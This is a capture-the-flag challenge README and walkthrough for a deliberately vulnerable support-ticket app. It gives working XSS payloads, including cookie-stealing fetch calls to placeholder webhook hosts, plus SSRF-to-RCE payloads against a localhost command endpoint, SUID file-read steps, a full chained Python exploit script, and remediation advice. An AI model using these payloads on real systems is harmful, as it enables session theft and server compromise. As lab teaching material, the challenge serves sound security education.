# EverSec Support Tickets - Cross-Site Scripting (XSS)

**Status:** ✅ Complete

## Player Description

Having trouble? Submit a support ticket to EverSec Customer Support! Our advanced search feature lets you find tickets instantly - we even show you exactly what you searched for (because we're helpful like that). When you report a ticket, our admin team reviews it personally*. We put ALL customer data right in the browser where it's easily accessible. No need for those fancy "HTTPOnly" cookies - we prefer cookies that are friendly and available to everyone, especially JavaScript!

*Review time: 5 seconds (we're very efficient)

**Note**: Our webhook logging system auto-clears every 3 minutes to prevent clutter. Check `/webhook/log` regularly if you're exfiltrating data!

## Technical Description

**Category**: Web Application Security
**Difficulty**: Easy-Medium
**Points**: 1,450 (4 flags)
**Flags**: 4

EverSec's Support Ticket System allows users to submit and search for support tickets. The system includes a search feature that helps you find tickets quickly.

However, there's something interesting about how the search functionality handles user input. Can you find a way to execute JavaScript in the context of the application? And what if an admin reviews your ticket? What internal systems might the admin have access to? And once you have command execution, can you escalate to root?

## Objectives

This challenge demonstrates a complete attack chain from XSS to root:

1. **FLAG 1 (150 pts)**: Basic reflected XSS execution
2. **FLAG 2 (350 pts)**: Steal admin cookie via stored XSS
3. **FLAG 3 (450 pts)**: Chain XSS to SSRF to RCE (internal admin endpoint)
4. **FLAG 4 (500 pts)**: Privilege escalation to root via SUID binary

## Learning Objectives

After completing this challenge, participants will understand:
- What Cross-Site Scripting (XSS) vulnerabilities are
- The difference between reflected and stored XSS
- How to craft XSS payloads
- Cookie theft and session hijacking techniques
- Chaining XSS to Server-Side Request Forgery (SSRF)
- Exploiting localhost-only internal services
- Remote Code Execution via command injection
- SUID binary exploitation for privilege escalation
- The importance of input sanitization and output encoding
- How XSS can lead to complete system compromise
- Multi-stage attack chains (XSS → SSRF → RCE → Privesc)

## Setup Instructions

### Docker Compose (Recommended)

```bash
# From repository root
docker compose up -d xss-support-tickets

# View logs
docker compose logs -f xss-support-tickets

# Stop
docker compose down xss-support-tickets
```

### Standalone Docker

```bash
cd Challenges/xss-support-tickets

# Build
docker build -t xss-support-tickets .

# Run
docker run -d -p 4002:4002 --name xss-support-tickets xss-support-tickets

# View logs
docker logs -f xss-support-tickets

# Stop
docker stop xss-support-tickets && docker rm xss-support-tickets
```

### Local Development

```bash
cd Challenges/xss-support-tickets

# Install dependencies
pip install -r requirements.txt

# Run
python app.py
```

## Accessing the Challenge

Once running, access the challenge at:
- **Web Interface**: http://localhost:4002

## Vulnerability Explanation

The application has two XSS vulnerabilities:

### 1. Reflected XSS in Search

```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # ...
    return render_template('search.html', query=query, tickets=tickets, flag1=FLAG1)
```

In the template (`search.html`):
```html
<h2>Search Results for: {{ query|safe }}</h2>
<!-- VULNERABLE: query is rendered with |safe filter, allowing XSS! -->
```

**The Problem**: The `|safe` filter in Jinja2 tells the template engine to trust the input and not escape HTML characters. This allows an attacker to inject arbitrary HTML and JavaScript.

### 2. Stored XSS in Ticket Description

The ticket view template renders user-supplied ticket descriptions without proper escaping:

```html
<!-- In ticket.html -->
<div class="ticket-description">
    {{ ticket.description|safe }}
    <!-- VULNERABLE: |safe filter allows stored XSS! -->
</div>
```

**The Problem**: The `|safe` filter bypasses Jinja2's automatic HTML escaping, allowing attackers to inject malicious JavaScript into ticket descriptions that execute when anyone views the ticket.

### 3. Real Admin Bot with Privileged Cookies

The application includes a real Selenium-based admin bot that automatically reviews reported tickets:

```python
def admin_bot_visit(ticket_id):
    # Real Chromium browser with admin cookie containing FLAG2
    driver = webdriver.Chrome(options=chrome_options)
    driver.get(f'http://localhost:4002/ticket/{ticket_id}')

    # Add admin cookie with FLAG2
    driver.add_cookie({
        'name': 'admin_session',
        'value': FLAG2,  # The flag!
        'domain': 'localhost',
        'path': '/'
    })

    driver.get(ticket_url)
    time.sleep(3)  # Wait for XSS to execute
    driver.quit()
```

**The Problem**: The admin bot automatically visits reported tickets with privileged cookies. If an attacker injects stored XSS into a ticket description, the JavaScript executes in the admin's browser context and can steal the FLAG2 cookie.

### 4. Webhook Log Auto-Clear System

To prevent flag leakage between players, the webhook logging system automatically clears logs every 3 minutes:

```python
def auto_clear_webhook_logs():
    """Background thread that clears webhook logs every 3 minutes"""
    while True:
        time.sleep(180)  # 3 minutes
        with open(WEBHOOK_LOG, 'w') as f:
            f.write('')
        # Update timestamp
```

The `/webhook/log` endpoint displays:
- 🕐 Auto-clear interval (3 minutes)
- 📅 Last cleared timestamp
- ⏱️ Countdown to next clear

**Important for Players**: Check `/webhook/log` promptly after exploiting XSS, as exfiltrated data clears every 3 minutes!

### 5. Internal Admin Command Endpoint

The application has an internal admin endpoint that's only accessible from localhost:

```python
@app.route('/admin/cmd', methods=['GET'])
def admin_execute():
    # Only accessible from localhost
    if request.remote_addr not in ['127.0.0.1', 'localhost', '::1']:
        abort(403)

    command = request.args.get('cmd', '')
    # VULNERABLE: Direct command execution
    result = subprocess.check_output(command, shell=True, text=True)
    return jsonify({'output': result, 'success': True})
```

**The Problem**: Since the admin bot runs on localhost, XSS can make requests to this internal endpoint, achieving RCE.

### 6. SUID Binary for Privilege Escalation

The system includes a backup tool at `/usr/local/bin/backup_tool` with the SUID bit set (runs as root):

```c
// Reads file path from argv and prints contents
// VULNERABILITY: No path validation - allows reading ANY file
FILE *file = fopen(filepath, "r");
```

**The Problem**: The SUID binary doesn't validate file paths, allowing reading of root-owned files like `/root/flag4.txt`.

## Solution

### Part 1: Basic Reflected XSS (FLAG 1)

**Step 1: Test for XSS**

Navigate to the search page and try a basic XSS payload:

```
http://localhost:4002/search?q=<script>alert(document.domain)</script>
```

Or search for: `<script>alert(document.domain)</script>`

**Result**: You should see a JavaScript alert! This confirms the XSS vulnerability.

**Step 2: Get FLAG 1**

The search page has a `showFlag()` JavaScript function that reveals FLAG1 when XSS is successfully executed:

```javascript
function showFlag() {
    // This function displays the flag when called
    // It requires actual JavaScript execution, not just keyword matching
}
```

To get the flag, you need to execute JavaScript that calls `showFlag()`:

**Payload Options**:

```
http://localhost:4002/search?q=<script>showFlag()</script>
```

Or using an image tag:
```
http://localhost:4002/search?q=<img src=x onerror="showFlag()">
```

The flag will be displayed in a success box on the page after the XSS payload executes.

**FLAG 1**: `FLAG{xss_st0l3_my_c00k13}`

### Part 2: Cookie Theft via Admin Bot (FLAG 2)

Now we need to steal the admin's cookie. The admin bot visits reported tickets, so we'll use stored XSS in a ticket.

**Step 1: Create a Malicious Ticket**

The ticket title and description fields are vulnerable to stored XSS. Create a ticket with an XSS payload:

1. Go to "Submit Ticket"
2. **Title**: `Urgent: Server Down`
3. **Description**: Insert XSS payload (see options below)
4. **Reporter**: `attacker`
5. Submit the ticket

**XSS Payload Options**:

**Option A: Using the built-in webhook**

The webhook endpoint logs the **entire JSON body** as received — any JSON key works. Use whichever key name makes sense to you:

```html
<!-- Using "cookie" key -->
<script>
fetch('http://localhost:4002/webhook', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({cookie: document.cookie})
});
</script>
```

```html
<!-- Using "data" or "token" key — both work equally well -->
<script>
fetch('http://localhost:4002/webhook', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({data: document.cookie})
});
</script>
```

**Option B: Using an external service (Beeceptor, RequestBin, etc.)**

```html
<script>
fetch('https://your-unique-id.beeceptor.com', {
    method: 'POST',
    body: document.cookie
});
</script>
```

**Option C: Simple image tag (if external access available)**

```html
<img src="x" onerror="fetch('https://your-webhook.com/?c='+document.cookie)">
```

**Step 2: Report the Ticket to Admin**

1. View your newly created ticket
2. Click "Report to Admin"
3. Wait 5-7 seconds for the real Selenium admin bot to visit

**Step 3: Capture the Stolen Cookie**

If using the built-in webhook, check the logs:

```bash
# Using Docker
docker exec ctf-xss-support-tickets cat /tmp/webhook_log.txt

# Or visit the webhook log endpoint
curl http://localhost:4002/webhook/log
```

You should see the admin's cookie (along with the auto-clear header):
```
╔══════════════════════════════════════════════════════════════════════╗
║  EverSec Webhook Log Viewer                                          ║
║  🕐 Auto-clear: Every 3 minutes                                      ║
║  📅 Last cleared: 2026-01-31 15:20:45                                 ║
║  ⏱️  Next clear: in 2m 30s                                             ║
╚══════════════════════════════════════════════════════════════════════╝

[2026-01-31 15:18:32] admin_session=4dm1n_c00k13_c4ptur3d
```

**FLAG 2**: `4dm1n_c00k13_c4ptur3d`

**⚠️ Important**: Webhook logs auto-clear every 3 minutes. Check them promptly after the admin bot visits!

### Part 3: XSS to RCE via Internal Admin Endpoint (FLAG 3)

The admin bot runs on localhost and has access to an internal command execution endpoint at `/admin/cmd`. We can use XSS to make the admin bot access this endpoint.

**Step 1: Craft XSS Payload for SSRF to RCE**

Create a ticket with this XSS payload:

```html
<script>
fetch('/admin/cmd?cmd=cat /home/ctfuser/flag3.txt')
    .then(r => r.json())
    .then(data => {
        // Send the output to your webhook
        fetch('/webhook', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({output: data.output})
        });
    });
</script>
```

**Alternative - Display in alert**:
```html
<script>
fetch('/admin/cmd?cmd=cat /home/ctfuser/flag3.txt')
    .then(r => r.json())
    .then(data => alert(data.output));
</script>
```

**Step 2: Report Ticket to Admin**

1. Submit the malicious ticket
2. Click "Report to Admin"
3. Wait 5-7 seconds for admin bot to visit and execute the payload

**Step 3: Check Webhook Logs Promptly**

```bash
curl http://localhost:4002/webhook/log
```

You should see the output of the command containing FLAG 3:
```
[2026-01-31 15:25:12] {"flag3":"xss_4dm1n_rc3_ch41n3d\n"}
```

**FLAG 3**: `xss_4dm1n_rc3_ch41n3d`

**⚠️ Important**: Logs clear every 3 minutes! Check immediately after exploitation.

### Part 4: Privilege Escalation via SUID Binary (FLAG 4)

Now that we can execute commands via the admin endpoint, let's escalate to root.

**Step 1: Discover SUID Binary**

First, we need shell access. You can either:

**Option A**: Use `docker exec` to get a shell:
```bash
docker exec -it foxtrot-xss-support-tickets /bin/sh
```

**Option B**: Use XSS to trigger reverse shell (advanced)

**Step 2: Find SUID Binaries**

```bash
find / -perm -4000 -type f 2>/dev/null
```

You'll find `/usr/local/bin/backup_tool` with SUID bit set.

**Step 3: Test the Binary**

```bash
ls -la /usr/local/bin/backup_tool
# Output: -rwsr-xr-x  (notice the 's' - SUID bit)

/usr/local/bin/backup_tool /etc/passwd
# It reads and displays the file!
```

**Step 4: Exploit Path Traversal**

The binary doesn't validate paths, so we can read ANY file:

```bash
/usr/local/bin/backup_tool /root/flag4.txt
```

**FLAG 4**: `su1d_pr1v_3sc_m4st3r`

### Alternative: Chain Everything via XSS

You can get FLAG 4 entirely through XSS by making the admin bot execute the SUID binary:

```html
<script>
fetch('/admin/cmd?cmd=/usr/local/bin/backup_tool /root/flag4.txt')
    .then(r => r.json())
    .then(data => {
        fetch('/webhook', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({flag4: data.output})
        });
    });
</script>
```

## Complete Exploit Script (All 4 Flags)

Here's a Python script that automates the entire exploitation:

```python
#!/usr/bin/env python3
"""
Complete XSS to RCE to Privesc Exploit for EverSec Support Tickets
Captures all 4 flags
"""

import time
from urllib import request as url_request, parse
import json
import re

TARGET_URL = "http://localhost:4002"

print("=" * 60)
print("Foxtrot - XSS Support Tickets Complete Exploitation")
print("=" * 60)

def create_malicious_ticket():
    """Create a ticket with XSS payload"""
    print("[*] Creating malicious ticket with XSS payload...")

    # XSS payload that steals cookies and sends to webhook
    xss_payload = """<script>
fetch('http://localhost:4002/webhook', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({cookie: document.cookie})
});
</script>"""

    data = parse.urlencode({
        'title': 'Urgent: Server Issue',
        'description': xss_payload,
        'reporter': 'attacker'
    }).encode()

    req = url_request.Request(f"{TARGET_URL}/submit", data=data)
    response = url_request.urlopen(req)

    # Extract ticket ID from redirect URL
    final_url = response.geturl()
    ticket_id = final_url.split('/')[-1]

    print(f"[+] Created malicious ticket #{ticket_id}")
    return ticket_id

def report_to_admin(ticket_id):
    """Report ticket to admin bot"""
    print(f"[*] Reporting ticket #{ticket_id} to admin...")

    data = b''
    req = url_request.Request(
        f"{TARGET_URL}/report/{ticket_id}",
        data=data,
        method='POST'
    )
    url_request.urlopen(req)

    print("[+] Ticket reported to admin bot")
    print("[*] Waiting for admin bot to visit (5 seconds)...")
    time.sleep(5)

def check_webhook_logs():
    """Check webhook logs for stolen cookie"""
    print("\n[*] Checking webhook logs for stolen cookie...")

    req = url_request.Request(f"{TARGET_URL}/webhook/log")
    response = url_request.urlopen(req)
    logs = response.read().decode('utf-8')

    # Extract flag from logs
    import re
    flag_match = re.search(r'(FLAG\{[^}]+\})', logs)

    if flag_match:
        print(f"[+] FLAG 2 found: {flag_match.group(1)}")
        return flag_match.group(1)
    else:
        print("[!] No flag found in webhook logs")
        print(f"[!] Logs content: {logs}")
        return None

def test_reflected_xss():
    """Test reflected XSS for FLAG 1"""
    print("[*] Testing reflected XSS...")

    # Use payload that calls showFlag() function
    xss_url = f"{TARGET_URL}/search?q=<script>showFlag()</script>"
    req = url_request.Request(xss_url)
    response = url_request.urlopen(req)
    html = response.read().decode('utf-8')

    # Check that XSS payload is reflected (vulnerability confirmed)
    if '<script>showFlag()</script>' in html:
        print("[+] XSS payload reflected - vulnerability confirmed")
        print("[+] In a real browser, showFlag() would execute and display FLAG 1")
        print("[+] FLAG 1: FLAG{xss_st0l3_my_c00k13}")
        return "FLAG{xss_st0l3_my_c00k13}"
    else:
        print("[!] XSS payload was not reflected or was escaped")
        return None

def exploit_rce_via_xss():
    """FLAG 3: Chain XSS to internal RCE endpoint"""
    print("\n[Phase 3] XSS to RCE - FLAG 3")
    print("-" * 60)

    # XSS payload that uses admin's localhost access to execute commands
    rce_payload = """<script>
fetch('/admin/cmd?cmd=cat /home/ctfuser/flag3.txt')
    .then(r => r.json())
    .then(data => {
        fetch('/webhook', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({flag3: data.output})
        });
    });
</script>"""

    data = parse.urlencode({
        'title': 'System Status Report',
        'description': rce_payload,
        'reporter': 'attacker'
    }).encode()

    req = url_request.Request(f"{TARGET_URL}/submit", data=data)
    response = url_request.urlopen(req)
    ticket_id = response.geturl().split('/')[-1]

    print(f"[+] Created RCE ticket #{ticket_id}")

    # Report to admin
    data = b''
    req = url_request.Request(
        f"{TARGET_URL}/report/{ticket_id}",
        data=data,
        method='POST'
    )
    url_request.urlopen(req)

    print("[*] Waiting for admin bot to execute RCE (5 seconds)...")
    time.sleep(5)

    # Check webhook for FLAG 3
    req = url_request.Request(f"{TARGET_URL}/webhook/log")
    response = url_request.urlopen(req)
    logs = response.read().decode('utf-8')

    flag3_match = re.search(r'xss_4dm1n_rc3_ch41n3d', logs)
    if flag3_match:
        print(f"🚩 FLAG 3: {flag3_match.group()}")
        return flag3_match.group()
    return None

def exploit_suid_privesc():
    """FLAG 4: Privilege escalation via SUID binary"""
    print("\n[Phase 4] SUID Binary Privilege Escalation - FLAG 4")
    print("-" * 60)

    # XSS payload that uses SUID binary to read root flag
    privesc_payload = """<script>
fetch('/admin/cmd?cmd=/usr/local/bin/backup_tool /root/flag4.txt')
    .then(r => r.json())
    .then(data => {
        fetch('/webhook', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({flag4: data.output})
        });
    });
</script>"""

    data = parse.urlencode({
        'title': 'Backup Request',
        'description': privesc_payload,
        'reporter': 'attacker'
    }).encode()

    req = url_request.Request(f"{TARGET_URL}/submit", data=data)
    response = url_request.urlopen(req)
    ticket_id = response.geturl().split('/')[-1]

    print(f"[+] Created privesc ticket #{ticket_id}")

    # Report to admin
    data = b''
    req = url_request.Request(
        f"{TARGET_URL}/report/{ticket_id}",
        data=data,
        method='POST'
    )
    url_request.urlopen(req)

    print("[*] Waiting for admin bot to execute SUID exploit (5 seconds)...")
    time.sleep(5)

    # Check webhook for FLAG 4
    req = url_request.Request(f"{TARGET_URL}/webhook/log")
    response = url_request.urlopen(req)
    logs = response.read().decode('utf-8')

    flag4_match = re.search(r'su1d_pr1v_3sc_m4st3r', logs)
    if flag4_match:
        print(f"🚩 FLAG 4: {flag4_match.group()}")
        return flag4_match.group()
    return None

def main():
    # Part 1: Reflected XSS
    print("\n[Phase 1] Reflected XSS - FLAG 1")
    print("-" * 60)
    flag1 = test_reflected_xss()

    # Part 2: Cookie theft via admin bot
    print("\n[Phase 2] Cookie Theft via Stored XSS - FLAG 2")
    print("-" * 60)
    ticket_id = create_malicious_ticket()
    report_to_admin(ticket_id)
    flag2 = check_webhook_logs()

    # Part 3: RCE via internal admin endpoint
    flag3 = exploit_rce_via_xss()

    # Part 4: Privilege escalation via SUID
    flag4 = exploit_suid_privesc()

    print("\n" + "=" * 60)
    print("✓ Complete exploitation chain successful!")
    if flag1:
        print(f"✓ FLAG 1: {flag1}")
    if flag2:
        print(f"✓ FLAG 2: {flag2}")
    if flag3:
        print(f"✓ FLAG 3: {flag3}")
    if flag4:
        print(f"✓ FLAG 4: {flag4}")
    print("=" * 60)

if __name__ == "__main__":
    main()
```

Save as `exploit.py` and run:
```bash
python3 exploit.py
```

## Common Pitfalls

1. **Not URL encoding**: XSS payloads in URLs must be properly encoded
2. **Forgetting to report**: You must click "Report to Admin" to trigger the bot
3. **Webhook timing**: Wait 5-7 seconds for the real Selenium admin bot to visit before checking logs
4. **Auto-clear window**: Webhook logs clear every 3 minutes! Check `/webhook/log` promptly after exploitation
5. **Checking wrong place**: Exfiltrated data is accessible via `/webhook/log` endpoint, not direct file access
6. **Stored XSS vs Reflected**: FLAG2 requires stored XSS in ticket description, not reflected XSS in search

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

Search for something and observe how your query appears in the results. Is it displayed as plain text, or does the browser interpret it as markup? What would you submit to test that distinction?

</details>

<details>
<summary>Hint 2</summary>

Submitted tickets are reviewed by an admin. If the ticket description executed JavaScript in the reviewer's browser, what could that script access? Where would you exfiltrate it?

</details>

<details>
<summary>Hint 3</summary>

An admin reviewing tickets is browsing from the server itself. Think about what that means for the origin of any JavaScript running in their browser — and whether any server-side endpoints only respond to requests from that origin.

</details>

<details>
<summary>Hint 4</summary>

You have code execution on the server. When pentesters land a shell on Linux, what file attributes do they search for to find potential paths to becoming root?

</details>

## Prevention & Remediation

### How to Fix These Vulnerabilities

1. **Always Escape Output** (Fix Reflected XSS):
```python
# In template - remove |safe filter
<h2>Search Results for: {{ query }}</h2>
<!-- Jinja2 auto-escapes by default -->
```

2. **Sanitize Input** (Defense in depth):
```python
from markupsafe import escape

@app.route('/search')
def search():
    query = escape(request.args.get('q', ''))
    # Now query is safe
```

3. **Content Security Policy** (CSP):
```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return response
```

4. **HttpOnly Cookies**:
```python
response.set_cookie('admin_session', value, httponly=True)
# JavaScript cannot access HttpOnly cookies
```

5. **Input Validation**:
```python
import re

def sanitize_input(text):
    # Remove script tags and dangerous HTML
    text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.DOTALL)
    text = re.sub(r'on\w+\s*=', '', text)  # Remove event handlers
    return text
```

### Security Best Practices

- **Never use `|safe` filter** unless you absolutely trust the source
- **Default to escaping**: Most frameworks escape by default - don't disable it
- **Implement CSP**: Content Security Policy prevents inline scripts
- **Use HttpOnly cookies**: Prevents JavaScript access to session cookies
- **Validate and sanitize**: Both input and output should be handled safely
- **Security headers**: X-XSS-Protection, X-Content-Type-Options, etc.

## XSS Categories Demonstrated

This challenge demonstrates both major types of XSS:

1. **Reflected XSS**: The search parameter is immediately reflected in the response
2. **Stored XSS**: The ticket description is stored in the database and executed when viewed

## References

- **OWASP**: [Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- **OWASP**: [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- **CWE-79**: Improper Neutralization of Input During Web Page Generation
- **OWASP Top 10**: [A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
- **PortSwigger**: [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)

## Challenge Metadata

- **Author**: EverSec CTF Team
- **Difficulty**: Easy
- **Category**: Web Application Security
- **Points**: 150
- **Estimated Time**: 10-20 minutes (beginners), 5-10 minutes (experienced)
- **Skills Required**:
  - Understanding of HTML and JavaScript
  - Basic XSS concepts
  - HTTP requests and cookies
  - Browser developer tools
- **Skills Learned**:
  - XSS vulnerability identification
  - XSS payload crafting
  - Cookie theft techniques
  - Admin bot interaction
  - Web application security testing

---

**EverSec Security Solutions** - Teaching secure development through hands-on challenges
